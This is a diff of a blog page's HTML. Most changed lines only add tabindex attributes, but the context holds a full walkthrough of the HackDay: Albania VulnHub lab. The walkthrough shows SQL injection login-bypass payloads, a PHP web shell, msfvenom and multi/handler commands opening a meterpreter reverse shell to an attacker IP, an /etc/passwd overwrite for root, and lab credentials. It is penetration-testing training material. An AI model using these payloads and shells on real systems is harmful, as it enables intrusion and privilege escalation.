@@ -128,7 +128,7 @@
                         <p>I was bored today so I thought it would be a good chance to try any of the current <a href="https://www.vulnhub.com/">VulnHub</a> VMs.
 I decided to try the latest <a href="https://www.vulnhub.com/entry/hackday-albania,167/">HackDay: Albania</a> from <a href="https://twitter.com/r_73en">@R-73eN</a>.</p>
 <p>At first I imported the VM into VirtualBox, did a quick <code>netdiscover</code> in kali to get the IP address and fired up <code>nmap</code>:</p>
-<pre><code>root@kali:~# nmap -sS -T4 -A -p- 192.168.56.101
+<pre tabindex="0"><code>root@kali:~# nmap -sS -T4 -A -p- 192.168.56.101
 
 Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-24 10:12 CET
 Nmap scan report for 192.168.56.101
@@ -162,12 +162,12 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds
 </code></pre><p>So there is only an open SSH port and one apache running on port 8008.</p>
 <p>The Startpage only presents some albanian text wich translates to (at least according to Google Translate):</p>
-<pre><code>Welcome
+<pre tabindex="0"><code>Welcome
 If I am, I know where to go;)
 OK ok, but not here :)
 </code></pre><p><a href="/img/vulnhub_hackday_albania/startpage.png"><img src="/img/vulnhub_hackday_albania/startpage_thumb.png" alt="Startpage"></a></p>
 <p>Nmap said the <code>robots.txt</code> on this host has 26 entries so lets have a look at those:</p>
-<pre><code>root@kali:~# curl -s http://192.168.56.101:8008/robots.txt
+<pre tabindex="0"><code>root@kali:~# curl -s http://192.168.56.101:8008/robots.txt
 Disallow: /rkfpuzrahngvat/
 Disallow: /slgqvasbiohwbu/
 Disallow: /tmhrwbtcjpixcv/
@@ -197,10 +197,10 @@ Disallow: /qjeotyqzgmfuzs/
 </code></pre><p>Opening the first 3 URLs by hand we see that every URL contains a HTML page with the same meme.</p>
 <p><img src="/img/vulnhub_hackday_albania/robots_meme.png" alt="Meme"></p>
 <p>So I wrote a quick and dirty script to get the memes from all directories to take a closer look:</p>
-<pre><code>for x in $(curl -s http://192.168.56.101:8008/robots.txt | sed -e &quot;s/Disallow: //&quot; | sed -e &quot;s/\///g&quot;); \
+<pre tabindex="0"><code>for x in $(curl -s http://192.168.56.101:8008/robots.txt | sed -e &quot;s/Disallow: //&quot; | sed -e &quot;s/\///g&quot;); \
   do wget -O $x.bin -o $x.log http://192.168.56.101:8008/$x/background.jpg; done
 </code></pre><p>Checking out the downloaded files I quickly noted that there is one meme missing:</p>
-<pre><code>root@kali:~/albania# file *.bin
+<pre tabindex="0"><code>root@kali:~/albania# file *.bin
 atoydiajqwpejc.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
 bupzejbkrxqfkd.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
 cvqafkclsyrgle.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
@@ -228,28 +228,28 @@ xqlvafxgntmbgz.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1
 yrmwbgyhouncha.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
 zsnxchzipvodib.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
 </code></pre><p>Checking the corresponding logfile shows that the image could not be found in folder <code>unisxcudkqjydw</code>.</p>
-<pre><code>root@kali:~/albania# cat unisxcudkqjydw.log
+<pre tabindex="0"><code>root@kali:~/albania# cat unisxcudkqjydw.log
 --2016-11-24 10:19:45--  http://192.168.56.101:8008/unisxcudkqjydw/background.jpg
 Connecting to 192.168.56.101:8008... connected.
 HTTP request sent, awaiting response... 404 Not Found
 2016-11-24 10:19:45 ERROR 404: Not Found.
 </code></pre><p>So lets call this folder in the browser to see, why this error happened. This directory is the only one with no meme in it, but a little hint:</p>
-<pre><code>IS there any /vulnbank/ in there ???
+<pre tabindex="0"><code>IS there any /vulnbank/ in there ???
 </code></pre><p>So after calling</p>
-<pre><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/
+<pre tabindex="0"><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/
 </code></pre><p>We are presented a login page for Secure Bank.</p>
 <p><a href="/img/vulnhub_hackday_albania/login.png"><img src="/img/vulnhub_hackday_albania/login_thumb.png" alt="Login"></a></p>
 <p>I first tried to log in with various default passwort combinations but none of them worked.</p>
 <p>After putting a single <code>'</code> in the username field, the application responds with an PHP error message:</p>
-<pre><code>Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/unisxcudkqjydw/vulnbank/client/config.php on line 102
+<pre tabindex="0"><code>Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/unisxcudkqjydw/vulnbank/client/config.php on line 102
 </code></pre><p><strong>BOOM</strong> looks like SQL-Injection. As I&rsquo;m lazy I fired up SQLMAP to do the job for me:</p>
-<pre><code>sqlmap -u &quot;http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/login.php&quot; --data &quot;username=&amp;password=&quot; --dbms mysql --level 5 --risk 3
+<pre tabindex="0"><code>sqlmap -u &quot;http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/login.php&quot; --data &quot;username=&amp;password=&quot; --dbms mysql --level 5 --risk 3
 </code></pre><p>Unfortunately SQLMAP was only able to verify the SQL-Injection but not exploit it - so I had to do it manually.</p>
 <p>Sending the request to Burp Intruder I tried the SQL Injection Fuzzing Payloads and it looks like the application is filtering some SQL keywords like &ldquo;AND&rdquo; and &ldquo;OR&rdquo;.</p>
 <p>Assuming the query looks something like this</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">select</span> <span style="color:#a6e22e">junk</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">where</span> <span style="color:#a6e22e">username</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$_GET[&#34;username&#34;]&#39;</span> <span style="color:#66d9ef">and</span> <span style="color:#a6e22e">password</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$_GET[&#34;password&#34;]&#39;</span>;
 </code></pre></div><p>a simple query like</p>
-<pre><code>username'; --
+<pre tabindex="0"><code>username'; --
 </code></pre><p>should bypass the check (note the extra space at the end).</p>
 <p>If the query works, the following SQL statement should be executed and the password check is commented out:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#66d9ef">select</span> junk <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;username&#39;</span>; <span style="color:#75715e">-- &#39; and password=&#39;&#39;;
@@ -257,31 +257,31 @@ HTTP request sent, awaiting response... 404 Not Found
 <p>Inserting the SQL-Injection payload as username und marking the missing username as injection point Burp was able to identify a user named <code>jeff</code>.</p>
 <p><a href="/img/vulnhub_hackday_albania/user_enumeration.png"><img src="/img/vulnhub_hackday_albania/user_enumeration_thumb.png" alt="Login"></a></p>
 <p>So the final payload to bypass the login is</p>
-<pre><code>jeff'; --
+<pre tabindex="0"><code>jeff'; --
 </code></pre><p>which results in the query</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#66d9ef">select</span> junk <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;jeff&#39;</span>;
 </code></pre></div><p>We are greeted with a ticket system with the ability to upload files. I first tried to upload a simple PHP shell but the application responds with an error message saying only graphic files with certain extensions are allowed. Trying to simply change the <code>Content-Type</code> header does not work so I decided to upload a normal image to see how the application behaves.
 After uploading we can call the ticket details and check out the image url.
 The image is included with the following URL which renders the image as text so this could be a simple PHP include vulnerability.</p>
-<pre><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=image.jpg
+<pre tabindex="0"><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=image.jpg
 </code></pre><p><img src="/img/vulnhub_hackday_albania/image_as_text.png" alt="pwned"></p>
 <p>So I just renamed my shell.php to shell.jpg and tried the upload again. After viewing the image in the ticket with</p>
-<pre><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=id
+<pre tabindex="0"><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=id
 </code></pre><p>we are able to execute commands as the www-data user.</p>
-<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<pre tabindex="0"><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre><p>shell.php content:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></code></pre></div><p>To make things easier I created a meterpreter binary with a jpg extension and uploaded it with a new ticket:</p>
-<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o meterpreter.jpg LHOST=192.168.56.102 LPORT=1337
+<pre tabindex="0"><code>msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o meterpreter.jpg LHOST=192.168.56.102 LPORT=1337
 </code></pre><p>After making the binary executable with</p>
-<pre><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=chmod%20%2bx%20./upload/meterpreter.jpg
+<pre tabindex="0"><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=chmod%20%2bx%20./upload/meterpreter.jpg
 </code></pre><p>we can verify it&rsquo;s now executable</p>
-<pre><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=ls%20-alh%20./upload/meterpreter.jpg
-</code></pre><pre><code>-rwxr-xr-x 1 www-data www-data 155 Nov 24 17:13 ./upload/meterpreter.jpg
+<pre tabindex="0"><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=ls%20-alh%20./upload/meterpreter.jpg
+</code></pre><pre tabindex="0"><code>-rwxr-xr-x 1 www-data www-data 155 Nov 24 17:13 ./upload/meterpreter.jpg
 </code></pre><p>Next step is to fire up a meterpreter listener and execute the binary via the web shell.</p>
-<pre><code>msfconsole -qx 'use multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.56.102; set LPORT 1337; set ExitOnSession false; run -j; jobs -v'
-</code></pre><pre><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=./upload/meterpreter.jpg
-</code></pre><pre><code>msf exploit(handler) &gt;
+<pre tabindex="0"><code>msfconsole -qx 'use multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.56.102; set LPORT 1337; set ExitOnSession false; run -j; jobs -v'
+</code></pre><pre tabindex="0"><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=./upload/meterpreter.jpg
+</code></pre><pre tabindex="0"><code>msf exploit(handler) &gt;
 [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
 [*] Sending stage (1495599 bytes) to 192.168.56.101
 [*] Meterpreter session 1 opened (192.168.56.102:1337 -&gt; 192.168.56.101:54486) at 2016-11-24 17:18:05 +0100
@@ -312,7 +312,7 @@ Server username: uid=33, gid=33, euid=33, egid=33, suid=33, sgid=33
 }
 </code></pre></div><p>Before executing the query the <code>OR</code>, <code>UNION</code> and <code>AND</code> keywords are removed and also the <code>'</code> is stripped from the password parameter.</p>
 <p>Now let&rsquo;s search for a privilege escalation on the server to get ourselves root. By looking at <code>/etc/passwd</code> we can see there is a user with a login shell called <code>taviso</code>.</p>
-<pre><code>$ cat /etc/passwd
+<pre tabindex="0"><code>$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -345,7 +345,7 @@ dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
 sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
 taviso:x:1000:1000:Taviso,,,:/home/taviso:/bin/bash
 </code></pre><p>Looking at the groups taviso is able to execute sudo so this might be a good start:</p>
-<pre><code>$ grep taviso /etc/group
+<pre tabindex="0"><code>$ grep taviso /etc/group
 adm:x:4:syslog,taviso
 cdrom:x:24:taviso
 sudo:x:27:taviso
@@ -361,9 +361,9 @@ $db_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;b
 $db_user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
 $db_password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;NuCiGoGo321&#34;</span>;
 </code></pre></div><p>Trying to login:</p>
-<pre><code>mysql -u root -pNuCiGoGo321
+<pre tabindex="0"><code>mysql -u root -pNuCiGoGo321
 </code></pre><p>Sadly there was no other content in the database and I did not want to try the latest mysql server race condition privescs because I thought that&rsquo;s lame and there has to be another way. But hey, at least we now have the valid logins for all users:</p>
-<pre><code>mysql&gt; select * from klienti;
+<pre tabindex="0"><code>mysql&gt; select * from klienti;
 select * from klienti;
 +----+-------------+---------+---------+----------+------------+
 | ID | emer        | mbiemer | bilanci | username | password   |
@@ -374,17 +374,17 @@ select * from klienti;
 2 rows in set (0.00 sec)
 </code></pre><p>Searching the system for world writeable files gave me a little <strong>WTF</strong> moment:
 <strong>/etc/passwd is writeable by every user</strong></p>
-<pre><code>$ find / -type f -perm -o+w -exec ls -l {} \; 2&gt;/dev/null | grep -v /proc/ | grep -v /sys/
+<pre tabindex="0"><code>$ find / -type f -perm -o+w -exec ls -l {} \; 2&gt;/dev/null | grep -v /proc/ | grep -v /sys/
 -rw-r--rw- 1 root root 1623 Oct 22 17:21 /etc/passwd
 -rwxrwxrwx 1 root root 0 Oct 22 16:56 /var/crash/.lock
 </code></pre><p>So I downloaded the <code>/etc/passwd</code> with meterpreter and generated a new password hash with python:</p>
-<pre><code>root@kali:~# python -c 'import crypt; print crypt.crypt(&quot;supersecretpassword&quot;, &quot;$6$saltsalt$&quot;)'
+<pre tabindex="0"><code>root@kali:~# python -c 'import crypt; print crypt.crypt(&quot;supersecretpassword&quot;, &quot;$6$saltsalt$&quot;)'
 $6$saltsalt$t084OTPu49EJVUgFTLQxZ4yArFIeFzEnpGtrpyifSoSmJuIk0rQ9YmVXUyd2.Is1eMV/S0loZUxni1ijH5Qem.
 </code></pre><p>I then replaced the second field of the user root and taviso in the passwd file with the new password hash and uploaded it again, overwriting the original <code>/etc/passwd</code>.</p>
 <p>Trying to SSH in with root and the new password failed - likely because root SSH login is disabled.
 But trying to SSH in with the user taviso works and we now have a working session!</p>
 <p>Knowing the user taviso is able to execute sudo, let&rsquo;s check his rights:</p>
-<pre><code>taviso@hackday:~$ sudo -l
+<pre tabindex="0"><code>taviso@hackday:~$ sudo -l
 [sudo] password for taviso:
 Matching Defaults entries for taviso on hackday:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -398,14 +398,14 @@ root@hackday:~#
 </code></pre><p>BOOM that escalated quickly.</p>
 <p><img src="/img/vulnhub_hackday_albania/escalated_quickly.jpg" alt="pwned"></p>
 <p>Now we are able to get the flag from the root directory:</p>
-<pre><code>root@hackday:~# cat flag.txt
+<pre tabindex="0"><code>root@hackday:~# cat flag.txt
 Urime,
 Tani nis raportin!
 
 d5ed38fdbf28bc4e58be142cf5a17cf5
 </code></pre><p><code>d5ed38fdbf28bc4e58be142cf5a17cf5</code> is the MD5 hash of the string <code>rio</code>.</p>
 <p>The original password hash of <code>taviso</code> extracted from <code>/etc/shadow</code>:</p>
-<pre><code>taviso:$6$RpYQyuNB$yYNQbBo6ICCb0pwNKBMVeQeA/NZwrYPxy4WnXs2NybNeGAh3XrmkJ94cuqA1.CYc0e07R.QbQEIdXLIL5U83T1:17096:0:99999:7:::
+<pre tabindex="0"><code>taviso:$6$RpYQyuNB$yYNQbBo6ICCb0pwNKBMVeQeA/NZwrYPxy4WnXs2NybNeGAh3XrmkJ94cuqA1.CYc0e07R.QbQEIdXLIL5U83T1:17096:0:99999:7:::
 </code></pre><p>Thanks <a href="https://twitter.com/r_73en">@R-73eN</a> for this VM!</p>
                     </div>
                 </section>
@@ -414,7 +414,7 @@ d5ed38fdbf28bc4e58be142cf5a17cf5
     <div class="pure-menu pure-menu-horizontal pure-menu-open">
         <ul>
             <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/FireFart/blog">Github</a></li>
+            <li>source code available on <a href="https://github.com/FireFart/firefart.github.io">Github</a></li>
         </ul>
     </div>
 </div>
